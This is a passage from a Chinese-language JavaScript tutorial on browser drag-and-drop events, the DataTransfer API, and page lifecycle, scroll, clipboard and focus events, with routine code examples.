   -  ``drop`` ：被拖拉的节点或选中的文本，释放到目标节点时，在目标节点上触发。注意，如果当前节点不允许 ``drop`` ，即使在该节点上方松开鼠标键，也不会触发该事件。如果用户按下 ESC 键，取消这个操作，也不会触发该事件。该事件的监听函数负责取出拖拉数据，并进行相关处理。

   下面的例子展示，如何动态改变被拖动节点的背景色。

   .. code:: javascript

      div.addEventListener('dragstart', function (e) {
        this.style.backgroundColor = 'red';
      }, false);
   
      div.addEventListener('dragend', function (e) {
        this.style.backgroundColor = 'green';
      }, false);

   上面代码中， ``div`` 节点被拖动时，背景色会变为红色，拖动结束，又变回绿色。

   下面是一个例子，展示如何实现将一个节点从当前父节点，拖拉到另一个父节点中。

   .. code:: javascript

      /* HTML 代码如下
       <div class="dropzone">
         <div id="draggable" draggable="true">
           该节点可拖拉
         </div>
       </div>
       <div class="dropzone"></div>
       <div class="dropzone"></div>
       <div class="dropzone"></div>
      */
   
      // 被拖拉节点
      var dragged;
   
      document.addEventListener('dragstart', function (event) {
        // 保存被拖拉节点
        dragged = event.target;
        // 被拖拉节点的背景色变透明
        event.target.style.opacity = 0.5;
      }, false);
   
      document.addEventListener('dragend', function (event) {
        // 被拖拉节点的背景色恢复正常
        event.target.style.opacity = '';
      }, false);
   
      document.addEventListener('dragover', function (event) {
        // 防止拖拉效果被重置，允许被拖拉的节点放入目标节点
        event.preventDefault();
      }, false);
   
      document.addEventListener('dragenter', function (event) {
        // 目标节点的背景色变紫色
        // 由于该事件会冒泡，所以要过滤节点
        if (event.target.className === 'dropzone') {
          event.target.style.background = 'purple';
        }
      }, false);
   
      document.addEventListener('dragleave', function( event ) {
        // 目标节点的背景色恢复原样
        if (event.target.className === 'dropzone') {
          event.target.style.background = '';
        }
      }, false);
   
      document.addEventListener('drop', function( event ) {
        // 防止事件默认行为（比如某些元素节点上可以打开链接），
        event.preventDefault();
        if (event.target.className === 'dropzone') {
          // 恢复目标节点背景色
          event.target.style.background = '';
          // 将被拖拉节点插入目标节点
          dragged.parentNode.removeChild(dragged);
          event.target.appendChild( dragged );
        }
      }, false);

   关于拖拉事件，有以下几个注意点。

   - 拖拉过程只触发以上这些拖拉事件，尽管鼠标在移动，但是鼠标事件不会触发。
   - 将文件从操作系统拖拉进浏览器，不会触发 ``dragstart`` 和 ``dragend`` 事件。
   -  ``dragenter`` 和 ``dragover`` 事件的监听函数，用来取出拖拉的数据（即允许放下被拖拉的元素）。由于网页的大部分区域不适合作为放下拖拉元素的目标节点，所以这两个事件的默认设置为当前节点不允许接受被拖拉的元素。如果想要在目标节点上放下的数据，首先必须阻止这两个事件的默认行为。

   .. code:: html

      <div ondragover="return false">
      <div ondragover="event.preventDefault()">

   上面代码中，如果不取消拖拉事件或者阻止默认行为，就不能在 ``div`` 节点上放下被拖拉的节点。

DragEvent 接口
--------------

   拖拉事件都继承了 ``DragEvent`` 接口，这个接口又继承了 ``MouseEvent`` 接口和 ``Event`` 接口。

   浏览器原生提供一个 ``DragEvent()`` 构造函数，用来生成拖拉事件的实例对象。

   .. code:: javascript

      new DragEvent(type, options)

    ``DragEvent()`` 构造函数接受两个参数，第一个参数是字符串，表示事件的类型，该参数必须；第二个参数是事件的配置对象，用来设置事件的属性，该参数可选。配置对象除了接受 ``MouseEvent`` 接口和 ``Event`` 接口的配置属性，还可以设置 ``dataTransfer`` 属性要么是 ``null`` ，要么是一个 ``DataTransfer`` 接口的实例。

    ``DataTransfer`` 的实例对象用来读写拖拉事件中传输的数据，详见下文《DataTransfer 接口》的部分。

DataTransfer 接口概述
--------------------

   所有拖拉事件的实例都有一个 ``DragEvent.dataTransfer`` 属性，用来读写需要传递的数据。这个属性的值是一个 ``DataTransfer`` 接口的实例。

   浏览器原生提供一个 ``DataTransfer()`` 构造函数，用来生成 ``DataTransfer`` 实例对象。

   .. code:: javascript

      var dataTrans = new DataTransfer();

    ``DataTransfer()`` 构造函数不接受参数。

   拖拉的数据分成两方面：数据的种类（又称格式）和数据的值。数据的种类是一个 MIME 字符串（比如 ``text/plain`` 、 ``image/jpeg`` ），数据的值是一个字符串。一般来说，如果拖拉一段文本，则数据默认就是那段文本；如果拖拉一个链接，则数据默认就是链接的 URL。

   拖拉事件开始时，开发者可以提供数据类型和数据值。拖拉过程中，开发者通过 ``dragenter`` 和 ``dragover`` 事件的监听函数，检查数据类型，以确定是否允许放下（drop）被拖拉的对象。比如，在只允许放下链接的区域，检查拖拉的数据类型是否为 ``text/uri-list`` 。

   发生 ``drop`` 事件时，监听函数取出拖拉的数据，对其进行处理。

DataTransfer 的实例属性
---------------------


DataTransfer.dropEffect
~~~~~~~~~~~~~~~~~~~~~~~~

    ``DataTransfer.dropEffect`` 属性用来设置放下（drop）被拖拉节点时的效果，会影响到拖拉经过相关区域时鼠标的形状。它可能取下面的值。

   - copy：复制被拖拉的节点
   - move：移动被拖拉的节点
   - link：创建指向被拖拉的节点的链接
   - none：无法放下被拖拉的节点

   除了上面这些值，设置其他的值都是无效的。

   .. code:: javascript

      target.addEventListener('dragover', function (e) {
        e.preventDefault();
        e.stopPropagation();
        e.dataTransfer.dropEffect = 'copy';
      });

   上面代码中，被拖拉元素一旦 ``drop`` ，接受的区域会复制该节点。

    ``dropEffect`` 属性一般在 ``dragenter`` 和 ``dragover`` 事件的监听函数中设置，对于 ``dragstart`` 、 ``drag`` 、 ``dragleave`` 这三个事件，该属性不起作用。因为该属性只对接受被拖拉的节点的区域有效，对被拖拉的节点本身是无效的。进入目标区域后，拖拉行为会初始化成设定的效果。

DataTransfer.effectAllowed
~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``DataTransfer.effectAllowed`` 属性设置本次拖拉中允许的效果。它可能取下面的值。

   - copy：复制被拖拉的节点
   - move：移动被拖拉的节点
   - link：创建指向被拖拉节点的链接
   - copyLink：允许 ``copy`` 或 ``link`` 
   - copyMove：允许 ``copy`` 或 ``move`` 
   - linkMove：允许 ``link`` 或 ``move`` 
   - all：允许所有效果
   - none：无法放下被拖拉的节点
   - uninitialized：默认值，等同于 ``all`` 

   如果某种效果是不允许的，用户就无法在目标节点中达成这种效果。

   这个属性与 ``dropEffect`` 属性是同一件事的两个方面。前者设置被拖拉的节点允许的效果，后者设置接受拖拉的区域的效果，它们往往配合使用。

    ``dragstart`` 事件的监听函数，可以用来设置这个属性。其他事件的监听函数里面设置这个属性是无效的。

   .. code:: javascript

      source.addEventListener('dragstart', function (e) {
        e.dataTransfer.effectAllowed = 'move';
      });
   
      target.addEventListener('dragover', function (e) {
        e.dataTransfer.dropEffect = 'move';
      });

   只要 ``dropEffect`` 属性和 ``effectAllowed`` 属性之中，有一个为 ``none`` ，就无法在目标节点上完成 ``drop`` 操作。

DataTransfer.files
~~~~~~~~~~~~~~~~~~~

    ``DataTransfer.files`` 属性是一个 FileList 对象，包含一组本地文件，可以用来在拖拉操作中传送。如果本次拖拉不涉及文件，则该属性为空的 FileList 对象。

   下面就是一个接收拖拉文件的例子。

   .. code:: javascript

      // HTML 代码如下
      // <div id="output" style="min-height: 200px;border: 1px solid black;">
      //   文件拖拉到这里
      // </div>
   
      var div = document.getElementById('output');
   
      div.addEventListener("dragenter", function( event ) {
        div.textContent = '';
        event.stopPropagation();
        event.preventDefault();
      }, false);
   
      div.addEventListener("dragover", function( event ) {
        event.stopPropagation();
        event.preventDefault();
      }, false);
   
      div.addEventListener("drop", function( event ) {
        event.stopPropagation();
        event.preventDefault();
        var files = event.dataTransfer.files;
        for (var i = 0; i < files.length; i++) {
          div.textContent += files[i].name + ' ' + files[i].size + '字节\n';
        }
      }, false);

   上面代码中，通过 ``dataTransfer.files`` 属性读取被拖拉的文件的信息。如果想要读取文件内容，就要使用 ``FileReader`` 对象。

   .. code:: javascript

      div.addEventListener('drop', function(e) {
        e.preventDefault();
        e.stopPropagation();
   
        var fileList = e.dataTransfer.files;
        if (fileList.length > 0) {
          var file = fileList[0];
          var reader = new FileReader();
          reader.onloadend = function(e) {
            if (e.target.readyState === FileReader.DONE) {
              var content = reader.result;
              div.innerHTML = 'File: ' + file.name + '\n\n' + content;
            }
          }
          reader.readAsBinaryString(file);
        }
      });

DataTransfer.types
~~~~~~~~~~~~~~~~~~~

    ``DataTransfer.types`` 属性是一个只读的数组，每个成员是一个字符串，里面是拖拉的数据格式（通常是 MIME 值）。比如，如果拖拉的是文字，对应的成员就是 ``text/plain`` 。

   下面是一个例子，通过检查 ``dataTransfer`` 属性的类型，决定是否允许在当前节点执行 ``drop`` 操作。

   .. code:: javascript

      function contains(list, value){
        for (var i = 0; i < list.length; ++i) {
          if(list[i] === value) return true;
        }
        return false;
      }
   
      function doDragOver(event) {
        var isLink = contains(event.dataTransfer.types, 'text/uri-list');
        if (isLink) event.preventDefault();
      }

   上面代码中，只有当被拖拉的节点有一个是链接时，才允许在当前节点放下。

DataTransfer.items
~~~~~~~~~~~~~~~~~~~

    ``DataTransfer.items`` 属性返回一个类似数组的只读对象（DataTransferItemList 实例），每个成员就是本次拖拉的一个对象（DataTransferItem 实例）。如果本次拖拉不包含对象，则返回一个空对象。

   DataTransferItemList 实例具有以下的属性和方法。

   -  ``length`` ：返回成员的数量
   -  ``add(data, type)`` ：增加一个指定内容和类型（比如 ``text/html`` 和 ``text/plain`` ）的字符串作为成员
   -  ``add(file)`` ： ``add`` 方法的另一种用法，增加一个文件作为成员
   -  ``remove(index)`` ：移除指定位置的成员
   -  ``clear()`` ：移除所有的成员

   DataTransferItem 实例具有以下的属性和方法。

   -  ``kind`` ：返回成员的种类（ ``string`` 还是 ``file`` ）。
   -  ``type`` ：返回成员的类型（通常是 MIME 值）。
   -  ``getAsFile()`` ：如果被拖拉是文件，返回该文件，否则返回 ``null`` 。
   -  ``getAsString(callback)`` ：如果被拖拉的是字符串，将该字符传入指定的回调函数处理。该方法是异步的，所以需要传入回调函数。

   下面是一个例子。

   .. code:: javascript

      div.addEventListener('drop', function (e) {
        e.preventDefault();
        if (e.dataTransfer.items != null) {
          for (var i = 0; i < e.dataTransfer.items.length; i++) {
            console.log(e.dataTransfer.items[i].kind + ': ' + e.dataTransfer.items[i].type);
          }
        }
      });

DataTransfer 的实例方法
---------------------


DataTransfer.setData()
~~~~~~~~~~~~~~~~~~~~~~~

    ``DataTransfer.setData()`` 方法用来设置拖拉事件所带有的数据。该方法没有返回值。

   .. code:: javascript

      event.dataTransfer.setData('text/plain', 'Text to drag');

   上面代码为当前的拖拉事件加入纯文本数据。

   该方法接受两个参数，都是字符串。第一个参数表示数据类型（比如 ``text/plain`` ），第二个参数是具体数据。如果指定类型的数据在 ``dataTransfer`` 属性不存在，那么这些数据将被加入，否则原有的数据将被新数据替换。

   如果是拖拉文本框或者拖拉选中的文本，会默认将对应的文本数据，添加到 ``dataTransfer`` 属性，不用手动指定。

   .. code:: html

      <div draggable="true">
        aaa
      </div>

   上面代码中，拖拉这个 ``<div>`` 元素会自动带上文本数据 ``aaa`` 。

   使用 ``setData`` 方法，可以替换到原有数据。

   .. code:: html

      <div
        draggable="true"
        ondragstart="event.dataTransfer.setData('text/plain', 'bbb')"
      >
        aaa
      </div>

   上面代码中，拖拉数据实际上是 ``bbb`` ，而不是 ``aaa`` 。

   下面是添加其他类型的数据。由于 ``text/plain`` 是最普遍支持的格式，为了保证兼容性，建议最后总是保存一份纯文本格式的数据。

   .. code:: javascript

      var dt = event.dataTransfer;
   
      // 添加链接
      dt.setData('text/uri-list', 'http://www.example.com');
      dt.setData('text/plain', 'http://www.example.com');
   
      // 添加 HTML 代码
      dt.setData('text/html', 'Hello there, <strong>stranger</strong>');
      dt.setData('text/plain', 'Hello there, <strong>stranger</strong>');
   
      // 添加图像的 URL
      dt.setData('text/uri-list', imageurl);
      dt.setData('text/plain', imageurl);

   可以一次提供多种格式的数据。

   .. code:: javascript

      var dt = event.dataTransfer;
      dt.setData('application/x-bookmark', bookmarkString);
      dt.setData('text/uri-list', 'http://www.example.com');
      dt.setData('text/plain', 'http://www.example.com');

   上面代码中，通过在同一个事件上面，存放三种类型的数据，使得拖拉事件可以在不同的对象上面， ``drop`` 不同的值。注意，第一种格式是一个自定义格式，浏览器默认无法读取，这意味着，只有某个部署了特定代码的节点，才可能 ``drop`` （读取到）这个数据。

DataTransfer.getData()
~~~~~~~~~~~~~~~~~~~~~~~

    ``DataTransfer.getData()`` 方法接受一个字符串（表示数据类型）作为参数，返回事件所带的指定类型的数据（通常是用 ``setData`` 方法添加的数据）。如果指定类型的数据不存在，则返回空字符串。通常只有 ``drop`` 事件触发后，才能取出数据。

   下面是一个 ``drop`` 事件的监听函数，用来取出指定类型的数据。

   .. code:: javascript

      function onDrop(event) {
        var data = event.dataTransfer.getData('text/plain');
        event.target.textContent = data;
        event.preventDefault();
      }

   上面代码取出拖拉事件的文本数据，将其替换成当前节点的文本内容。注意，这时还必须取消浏览器的默认行为，因为假如用户拖拉的是一个链接，浏览器默认会在当前窗口打开这个链接。

    ``getData`` 方法返回的是一个字符串，如果其中包含多项数据，就必须手动解析。

   .. code:: javascript

      function doDrop(event) {
        var lines = event.dataTransfer.getData('text/uri-list').split('\n');
        for (let line of lines) {
          let link = document.createElement('a');
          link.href = line;
          link.textContent = line;
          event.target.appendChild(link);
        }
        event.preventDefault();
      }

   上面代码中， ``getData`` 方法返回的是一组链接，就必须自行解析。

   类型值指定为 ``URL`` ，可以取出第一个有效链接。

   .. code:: javascript

      var link = event.dataTransfer.getData('URL');

   下面的例子是从多种类型的数据里面取出数据。

   .. code:: javascript

      function doDrop(event) {
        var types = event.dataTransfer.types;
        var supportedTypes = ['text/uri-list', 'text/plain'];
        types = supportedTypes.filter(function (value) { types.includes(value) });
        if (types.length) {
          var data = event.dataTransfer.getData(types[0]);
        }
        event.preventDefault();
      }

DataTransfer.clearData()
~~~~~~~~~~~~~~~~~~~~~~~~~

    ``DataTransfer.clearData()`` 方法接受一个字符串（表示数据类型）作为参数，删除事件所带的指定类型的数据。如果没有指定类型，则删除所有数据。如果指定类型不存在，则调用该方法不会产生任何效果。

   .. code:: javascript

      event.dataTransfer.clearData('text/uri-list');

   上面代码清除事件所带的 ``text/uri-list`` 类型的数据。

   该方法不会移除拖拉的文件，因此调用该方法后， ``DataTransfer.types`` 属性可能依然会返回 ``Files`` 类型（前提是存在文件拖拉）。

   注意，该方法只能在 ``dragstart`` 事件的监听函数之中使用，因为这是拖拉操作的数据唯一可写的时机。

DataTransfer.setDragImage()
~~~~~~~~~~~~~~~~~~~~~~~~~~~~

   拖动过程中（ ``dragstart`` 事件触发后），浏览器会显示一张图片跟随鼠标一起移动，表示被拖动的节点。这张图片是自动创造的，通常显示为被拖动节点的外观，不需要自己动手设置。

    ``DataTransfer.setDragImage()`` 方法可以自定义这张图片。它接受三个参数。第一个是 ``<img>`` 节点或者 ``<canvas>`` 节点，如果省略或为 ``null`` ，则使用被拖动的节点的外观；第二个和第三个参数为鼠标相对于该图片左上角的横坐标和纵坐标。

   下面是一个例子。

   .. code:: javascript

      /* HTML 代码如下
       <div id="drag-with-image" class="dragdemo" draggable="true">
         drag me
       </div>
      */
   
      var div = document.getElementById('drag-with-image');
      div.addEventListener('dragstart', function (e) {
        var img = document.createElement('img');
        img.src = 'http://path/to/img';
        e.dataTransfer.setDragImage(img, 0, 0);
      }, false);

/🟠 其他常见事件
==============

资源事件
-------


beforeunload 事件
~~~~~~~~~~~~~~~~

    ``beforeunload`` 事件在窗口、文档、各种资源将要卸载前触发。它可以用来防止用户不小心卸载资源。

   如果该事件对象的 ``returnValue`` 属性是一个非空字符串，那么浏览器就会弹出一个对话框，询问用户是否要卸载该资源。但是，用户指定的字符串可能无法显示，浏览器会展示预定义的字符串。如果用户点击“取消”按钮，资源就不会卸载。

   .. code:: javascript

      window.addEventListener('beforeunload', function (event) {
        event.returnValue = '你确定离开吗？';
      });

   上面代码中，用户如果关闭窗口，浏览器会弹出一个窗口，要求用户确认。

   浏览器对这个事件的行为很不一致，有的浏览器调用 ``event.preventDefault()`` ，也会弹出对话框。IE 浏览器需要显式返回一个非空的字符串，才会弹出对话框。而且，大多数浏览器在对话框中不显示指定文本，只显示默认文本。因此，可以采用下面的写法，取得最大的兼容性。

   .. code:: javascript

      window.addEventListener('beforeunload', function (e) {
        var confirmationMessage = '确认关闭窗口？';
   
        e.returnValue = confirmationMessage;
        return confirmationMessage;
      });

   注意，许多手机浏览器（比如 Safari）默认忽略这个事件，桌面浏览器也有办法忽略这个事件。所以，它可能根本不会生效，不能依赖它来阻止用户关闭浏览器窗口，最好不要使用这个事件。

   另外，一旦使用了 ``beforeunload`` 事件，浏览器就不会缓存当前网页，使用“回退”按钮将重新向服务器请求网页。这是因为监听这个事件的目的，一般是为了网页状态，这时缓存页面的初始状态就没意义了。

unload 事件
~~~~~~~~~~

    ``unload`` 事件在窗口关闭或者 ``document`` 对象将要卸载时触发。它的触发顺序排在 ``beforeunload`` 、 ``pagehide`` 事件后面。

    ``unload`` 事件发生时，文档处于一个特殊状态。所有资源依然存在，但是对用户来说都不可见，UI 互动全部无效。这个事件是无法取消的，即使在监听函数里面抛出错误，也不能停止文档的卸载。

   .. code:: javascript

      window.addEventListener('unload', function(event) {
        console.log('文档将要卸载');
      });

   手机上，浏览器或系统可能会直接丢弃网页，这时该事件根本不会发生。而且跟 ``beforeunload`` 事件一样，一旦使用了 ``unload`` 事件，浏览器就不会缓存当前网页，理由同上。因此，任何情况下都不应该依赖这个事件，指定网页卸载时要执行的代码，可以考虑完全不使用这个事件。

   该事件可以用 ``pagehide`` 代替。

load 事件，error 事件
~~~~~~~~~~~~~~~~~~~

    ``load`` 事件在页面或某个资源加载成功时触发。注意，页面或资源从浏览器缓存加载，并不会触发 ``load`` 事件。

   .. code:: javascript

      window.addEventListener('load', function(event) {
        console.log('所有资源都加载完成');
      });

    ``error`` 事件是在页面或资源加载失败时触发。 ``abort`` 事件在用户取消加载时触发。

   这三个事件实际上属于进度事件，不仅发生在 ``document`` 对象，还发生在各种外部资源上面。浏览网页就是一个加载各种资源的过程，图像（image）、样式表（style sheet）、脚本（script）、视频（video）、音频（audio）、Ajax请求（XMLHttpRequest）等等。这些资源和 ``document`` 对象、 ``window`` 对象、XMLHttpRequestUpload 对象，都会触发 ``load`` 事件和 ``error`` 事件。

   最后，页面的 ``load`` 事件也可以用 ``pageshow`` 事件代替。

session 历史事件
---------------


pageshow 事件，pagehide 事件
~~~~~~~~~~~~~~~~~~~~~~~~~~

   默认情况下，浏览器会在当前会话（session）缓存页面，当用户点击“前进/后退”按钮时，浏览器就会从缓存中加载页面。

    ``pageshow`` 事件在页面加载时触发，包括第一次加载和从缓存加载两种情况。如果要指定页面每次加载（不管是不是从浏览器缓存）时都运行的代码，可以放在这个事件的监听函数。

   第一次加载时，它的触发顺序排在 ``load`` 事件后面。从缓存加载时， ``load`` 事件不会触发，因为网页在缓存中的样子通常是 ``load`` 事件的监听函数运行后的样子，所以不必重复执行。同理，如果是从缓存中加载页面，网页内初始化的 JavaScript 脚本（比如 DOMContentLoaded 事件的监听函数）也不会执行。

   .. code:: javascript

      window.addEventListener('pageshow', function(event) {
        console.log('pageshow: ', event);
      });

    ``pageshow`` 事件有一个 ``persisted`` 属性，返回一个布尔值。页面第一次加载时，这个属性是 ``false`` ；当页面从缓存加载时，这个属性是 ``true`` 。

   .. code:: javascript

      window.addEventListener('pageshow', function(event){
        if (event.persisted) {
          // ...
        }
      });

    ``pagehide`` 事件与 ``pageshow`` 事件类似，当用户通过“前进/后退”按钮，离开当前页面时触发。它与 unload 事件的区别在于，如果在 window 对象上定义 ``unload`` 事件的监听函数之后，页面不会保存在缓存中，而使用 ``pagehide`` 事件，页面会保存在缓存中。

    ``pagehide`` 事件实例也有一个 ``persisted`` 属性，将这个属性设为 ``true`` ，就表示页面要保存在缓存中；设为 ``false`` ，表示网页不保存在缓存中，这时如果设置了unload 事件的监听函数，该函数将在 pagehide 事件后立即运行。

   如果页面包含 ``<frame>`` 或 ``<iframe>`` 元素，则 ``<frame>`` 页面的 ``pageshow`` 事件和 ``pagehide`` 事件，都会在主页面之前触发。

   注意，这两个事件只在浏览器的 ``history`` 对象发生变化时触发，跟网页是否可见没有关系。

popstate 事件
~~~~~~~~~~~~

    ``popstate`` 事件在浏览器的 ``history`` 对象的当前记录发生显式切换时触发。注意，调用 ``history.pushState()`` 或 ``history.replaceState()`` ，并不会触发 ``popstate`` 事件。该事件只在用户在 ``history`` 记录之间显式切换时触发，比如鼠标点击“后退/前进”按钮，或者在脚本中调用 ``history.back()`` 、 ``history.forward()`` 、 ``history.go()`` 时触发。

   该事件对象有一个 ``state`` 属性，保存 ``history.pushState`` 方法和 ``history.replaceState`` 方法为当前记录添加的 ``state`` 对象。

   .. code:: javascript

      window.onpopstate = function (event) {
        console.log('state: ' + event.state);
      };
      history.pushState({page: 1}, 'title 1', '?page=1');
      history.pushState({page: 2}, 'title 2', '?page=2');
      history.replaceState({page: 3}, 'title 3', '?page=3');
      history.back(); // state: {"page":1}
      history.back(); // state: null
      history.go(2);  // state: {"page":3}

   上面代码中， ``pushState`` 方法向 ``history`` 添加了两条记录，然后 ``replaceState`` 方法替换掉当前记录。因此，连续两次 ``back`` 方法，会让当前条目退回到原始网址，它没有附带 ``state`` 对象，所以事件的 ``state`` 属性为 ``null`` ，然后前进两条记录，又回到 ``replaceState`` 方法添加的记录。

   浏览器对于页面首次加载，是否触发 ``popstate`` 事件，处理不一样，Firefox 不触发该事件。

hashchange 事件
~~~~~~~~~~~~~~

    ``hashchange`` 事件在 URL 的 hash 部分（即 ``#`` 号后面的部分，包括 ``#`` 号）发生变化时触发。该事件一般在 ``window`` 对象上监听。

    ``hashchange`` 的事件实例具有两个特有属性： ``oldURL`` 属性和 ``newURL`` 属性，分别表示变化前后的完整 URL。

   .. code:: javascript

      // URL 是 http://www.example.com/
      window.addEventListener('hashchange', myFunction);
   
      function myFunction(e) {
        console.log(e.oldURL);
        console.log(e.newURL);
      }
   
      location.hash = 'part2';
      // http://www.example.com/
      // http://www.example.com/#part2

网页状态事件
----------


DOMContentLoaded 事件
~~~~~~~~~~~~~~~~~~~~

   网页下载并解析完成以后，浏览器就会在 ``document`` 对象上触发 DOMContentLoaded 事件。这时，仅仅完成了网页的解析（整张页面的 DOM 生成了），所有外部资源（样式表、脚本、iframe 等等）可能还没有下载结束。也就是说，这个事件比 ``load`` 事件，发生时间早得多。

   .. code:: javascript

      document.addEventListener('DOMContentLoaded', function (event) {
        console.log('DOM生成');
      });

   注意，网页的 JavaScript 脚本是同步执行的，脚本一旦发生堵塞，将推迟触发 ``DOMContentLoaded`` 事件。

   .. code:: javascript

      document.addEventListener('DOMContentLoaded', function (event) {
        console.log('DOM 生成');
      });
   
      // 这段代码会推迟触发 DOMContentLoaded 事件
      for(var i = 0; i < 1000000000; i++) {
        // ...
      }

readystatechange 事件
~~~~~~~~~~~~~~~~~~~~

    ``readystatechange`` 事件当 Document 对象和 XMLHttpRequest 对象的 ``readyState`` 属性发生变化时触发。 ``document.readyState`` 有三个可能的值： ``loading`` （网页正在加载）、 ``interactive`` （网页已经解析完成，但是外部资源仍然处在加载状态）和 ``complete`` （网页和所有外部资源已经结束加载， ``load`` 事件即将触发）。

   .. code:: javascript

      document.onreadystatechange = function () {
        if (document.readyState === 'interactive') {
          // ...
        }
      }

   这个事件可以看作 ``DOMContentLoaded`` 事件的另一种实现方法。

窗口事件
-------


scroll 事件
~~~~~~~~~~

    ``scroll`` 事件在文档或文档元素滚动时触发，主要出现在用户拖动滚动条。

   .. code:: javascript

      window.addEventListener('scroll', callback);

   该事件会连续地大量触发，所以它的监听函数之中不应该有非常耗费计算的操作。推荐的做法是使用 ``requestAnimationFrame`` 或 ``setTimeout`` 控制该事件的触发频率，然后可以结合 ``customEvent`` 抛出一个新事件。

   .. code:: javascript

      (function () {
        var throttle = function (type, name, obj) {
          var obj = obj || window;
          var running = false;
          var func = function () {
            if (running) { return; }
            running = true;
            requestAnimationFrame(function() {
              obj.dispatchEvent(new CustomEvent(name));
              running = false;
            });
          };
          obj.addEventListener(type, func);
        };
   
        // 将 scroll 事件转为 optimizedScroll 事件
        throttle('scroll', 'optimizedScroll');
      })();
   
      window.addEventListener('optimizedScroll', function() {
        console.log('Resource conscious scroll callback!');
      });

   上面代码中， ``throttle()`` 函数用于控制事件触发频率，它有一个内部函数 ``func()`` ，每次 ``scroll`` 事件实际上触发的是这个函数。 ``func()`` 函数内部使用 ``requestAnimationFrame()`` 方法，保证只有每次页面重绘时（每秒60次），才可能会触发 ``optimizedScroll`` 事件，从而实际上将 ``scroll`` 事件转换为 ``optimizedScroll`` 事件，触发频率被控制在每秒最多60次。

   改用 ``setTimeout()`` 方法，可以放置更大的时间间隔。

   .. code:: javascript

      (function() {
        window.addEventListener('scroll', scrollThrottler, false);
   
        var scrollTimeout;
        function scrollThrottler() {
          if (!scrollTimeout) {
            scrollTimeout = setTimeout(function () {
              scrollTimeout = null;
              actualScrollHandler();
            }, 66);
          }
        }
   
        function actualScrollHandler() {
          // ...
        }
      }());

   上面代码中，每次 ``scroll`` 事件都会执行 ``scrollThrottler`` 函数。该函数里面有一个定时器 ``setTimeout`` ，每66毫秒触发一次（每秒15次）真正执行的任务 ``actualScrollHandler`` 。

   下面是一个更一般的 ``throttle`` 函数的写法。

   .. code:: javascript

      function throttle(fn, wait) {
        var time = Date.now();
        return function() {
          if ((time + wait - Date.now()) < 0) {
            fn();
            time = Date.now();
          }
        }
      }
   
      window.addEventListener('scroll', throttle(callback, 1000));

   上面的代码将 ``scroll`` 事件的触发频率，限制在一秒一次。

    ``lodash`` 函数库提供了现成的 ``throttle`` 函数，可以直接使用。

   .. code:: javascript

      window.addEventListener('scroll', _.throttle(callback, 1000));

   本书前面介绍过 ``debounce`` 的概念， ``throttle`` 与它区别在于， ``throttle`` 是“节流”，确保一段时间内只执行一次，而 ``debounce`` 是“防抖”，要连续操作结束后再执行。以网页滚动为例， ``debounce`` 要等到用户停止滚动后才执行， ``throttle`` 则是如果用户一直在滚动网页，那么在滚动过程中还是会执行。

resize 事件
~~~~~~~~~~

    ``resize`` 事件在改变浏览器窗口大小时触发，主要发生在 ``window`` 对象上面。

   .. code:: javascript

      var resizeMethod = function () {
        if (document.body.clientWidth < 768) {
          console.log('移动设备的视口');
        }
      };
   
      window.addEventListener('resize', resizeMethod, true);

   该事件也会连续地大量触发，所以最好像上面的 ``scroll`` 事件一样，通过 ``throttle`` 函数控制事件触发频率。

fullscreenchange 事件，fullscreenerror 事件
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    ``fullscreenchange`` 事件在进入或退出全屏状态时触发，该事件发生在 ``document`` 对象上面。

   .. code:: javascript

      document.addEventListener('fullscreenchange', function (event) {
        console.log(document.fullscreenElement);
      });

    ``fullscreenerror`` 事件在浏览器无法切换到全屏状态时触发。

剪贴板事件
--------

   以下三个事件属于剪贴板操作的相关事件。

   -  ``cut`` ：将选中的内容从文档中移除，加入剪贴板时触发。
   -  ``copy`` ：进行复制动作时触发。
   -  ``paste`` ：剪贴板内容粘贴到文档后触发。

   举例来说，如果希望禁止输入框的粘贴事件，可以使用下面的代码。

   .. code:: javascript

      inputElement.addEventListener('paste', e => e.preventDefault());

   上面的代码使得用户无法在 ``<input>`` 输入框里面粘贴内容。

    ``cut`` 、 ``copy`` 、 ``paste`` 这三个事件的事件对象都是 ``ClipboardEvent`` 接口的实例。 ``ClipboardEvent`` 有一个实例属性 ``clipboardData`` ，是一个 DataTransfer 对象，存放剪贴的数据。具体的 API 接口和操作方法，请参见《拖拉事件》的 DataTransfer 对象部分。

   .. code:: javascript

      document.addEventListener('copy', function (e) {
        e.clipboardData.setData('text/plain', 'Hello, world!');
        e.clipboardData.setData('text/html', '<b>Hello, world!</b>');
        e.preventDefault();
      });

   上面的代码使得复制进入剪贴板的，都是开发者指定的数据，而不是用户想要拷贝的数据。

焦点事件
-------

   焦点事件发生在元素节点和 ``document`` 对象上面，与获得或失去焦点相关。它主要包括以下四个事件。

   -  ``focus`` ：元素节点获得焦点后触发，该事件不会冒泡。
   -  ``blur`` ：元素节点失去焦点后触发，该事件不会冒泡。
   -  ``focusin`` ：元素节点将要获得焦点时触发，发生在 ``focus`` 事件之前。该事件会冒泡。
   -  ``focusout`` ：元素节点将要失去焦点时触发，发生在 ``blur`` 事件之前。该事件会冒泡。

   这四个事件的事件对象都继承了 ``FocusEvent`` 接口。 ``FocusEvent`` 实例具有以下属性。

   -  ``FocusEvent.target`` ：事件的目标节点。
   -  ``FocusEvent.relatedTarget`` ：对于 ``focusin`` 事件，返回失去焦点的节点；对于 ``focusout`` 事件，返回将要接受焦点的节点；对于 ``focus`` 和 ``blur`` 事件，返回 ``null`` 。

   由于 ``focus`` 和 ``blur`` 事件不会冒泡，只能在捕获阶段触发，所以 ``addEventListener`` 方法的第三个参数需要设为 ``true`` 。

   .. code:: javascript

      form.addEventListener('focus', function (event) {
        event.target.style.background = 'pink';
      }, true);
   
      form.addEventListener('blur', function (event) {
        event.target.style.background = '';
      }, true);

   上面代码针对表单的文本输入框，接受焦点时设置背景色，失去焦点时去除背景色。

CustomEvent 接口
---------------

   CustomEvent 接口用于生成自定义的事件实例。那些浏览器预定义的事件，虽然可以手动生成，但是往往不能在事件上绑定数据。如果需要在触发事件的同时，传入指定的数据，就可以使用 CustomEvent 接口生成的自定义事件对象。

   浏览器原生提供 ``CustomEvent()`` 构造函数，用来生成 CustomEvent 事件实例。

   .. code:: javascript

      new CustomEvent(type, options)

    ``CustomEvent()`` 构造函数接受两个参数。第一个参数是字符串，表示事件的名字，这是必须的。第二个参数是事件的配置对象，这个参数是可选的。 ``CustomEvent`` 的配置对象除了接受 Event 事件的配置属性，只有一个自己的属性。

